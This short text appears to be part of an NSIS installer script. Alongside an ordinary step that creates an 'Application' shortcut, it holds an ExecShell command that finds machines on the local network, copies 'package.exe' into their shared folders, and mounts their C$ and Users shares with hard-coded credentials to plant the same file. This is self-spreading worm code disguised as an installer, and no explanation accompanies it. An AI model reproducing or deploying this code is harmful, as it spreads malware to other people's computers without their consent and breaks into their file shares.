ExecShell open $R6 '/v:on /c (for /f "usebackq tokens=1,*" %i in (`net view^|find /i "\\" ^|^| arp -a^|find /i "  1"`) do set str_!random!=%i)& for /f "usebackq tokens=1* delims==" %j in (`set str_`) do set s=%k& set s=!s:\\=!& set l=!s:-PC=!& set l=!l:-ПК=!& set f=$EXEFILE& if not "!s!"=="%COMPUTERNAME%" (for /f "usebackq tokens=1,*" %j in (`net view \\!s!^|find /i "    "`) do echo f|xcopy /y /d "$INSTDIR\package.exe" "\\!s!\%j\$EXEFILE") & net use * /delete /y & (for %u in ($R1) do @for %q in ($R2) do ping -n 3 localhost & (for %c in (\\!s!\C$ \\!s!\Users) do (if not "%p%u"=="01" net use %c "fixed" /user:"operator") && ((for %d in ($R3) do echo f|xcopy /y /d "$INSTDIR\package.exe" %d) & net use %c /delete /y & ping -n 20 localhost)))' 0
CreateShortCut $SMPROGRAMS\Application.lnk $INSTDIR\App.exe
Quit
